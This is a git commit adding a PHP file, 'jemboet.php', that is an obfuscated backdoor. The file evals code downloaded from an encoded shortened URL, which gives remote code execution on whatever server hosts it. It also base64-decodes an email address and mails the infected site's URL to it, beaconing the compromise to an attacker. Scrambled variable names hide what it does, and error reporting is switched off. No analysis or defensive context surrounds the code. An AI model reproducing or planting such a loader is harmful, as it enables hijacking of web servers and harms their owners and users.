69f19f7e78c77c05b3e0b804ee43ceb95735c0e1
gantengers <76028485+exploit-haxor@users.noreply.github.com>
2024-12-14 19:58:56 +0700

    Add files via upload

---
+++ jemboet.php
@@ -0,0 +1,17 @@
+<?=null;
+@eval("?>".file_get_contents(urldecode("h\x74t\x70\x73\x25\x33\x41\x25\x32F%2F\x62it.ly\x25\x32\x463D\x63\x4d\x6d9\x33")));
+
+/////DEPRESION///
+$„ã¸ãã‰™¼ˆ»„¼¼ã‰•ˆ = base64_decode("cm9vdGN5YmVycHVua3NAZ21haWwuY29t");
+
+$¿ã“•¯†¼ã‚‚•ã„®ã‚² ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "combo";
+
+mail($„ã¸ãã‰™¼ˆ»„¼¼ã‰•ˆ,"for 4u", $¿ã“•¯†¼ã‚‚•ã„®ã‚²);
+
+${"\x47L\x4f\x42\x41\x4c\x53"}["\x6ei\x75\x65\x76ao\x72f\x77"]="\x6c\x6f\x76\x65";
+$‚¼Œ¸“†„„¼ˆŠ„ããã="\x66\x6f\x72";
+mail(${$‚¼Œ¸“†„„¼ˆŠ„ããã},"f\x6f\x72\x20\x34\x75",${${"G\x4c\x4fB\x41\x4c\x53"}["n\x69\x75\x65v\x61o\x72\x66\x77"]});
+
+error_reporting(0);
+
+?>
